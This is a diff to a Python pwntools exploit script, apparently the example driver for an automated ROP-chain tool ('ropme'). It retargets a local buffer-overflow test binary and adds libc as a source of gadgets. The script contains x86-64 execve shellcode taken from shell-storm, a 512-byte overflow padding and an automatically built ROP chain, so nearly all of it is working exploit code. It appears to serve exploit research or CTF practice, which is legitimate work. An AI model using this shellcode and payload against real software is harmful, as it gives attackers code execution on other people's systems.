@@ -2,9 +2,9 @@ import sys, logging, binascii
 from pwn import *
 import ropme, goal
 
-filename = './example/bof_shell'
+filename = './example/bof_read_got'
 p = process([filename,'3000'])
-#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40064f\nbreak *mprotect\nbreak *0x4006da")
+#gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\nbreak *0x400677")
 
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
     "\x48\x31\xd2"                                  # xor    %rdx, %rdx
@@ -21,7 +21,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 )
 
 files = [(filename, 0)]
-goal_resolver = goal.create_from_arguments(files, [], [["shellcode_hex", binascii.hexlify(shellcode)]])
+goal_resolver = goal.create_from_arguments(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
 rop = ropme.rop(files, goal_resolver, logging.CRITICAL)
 
 payload = 'A'*512 + 'B'*8 + rop
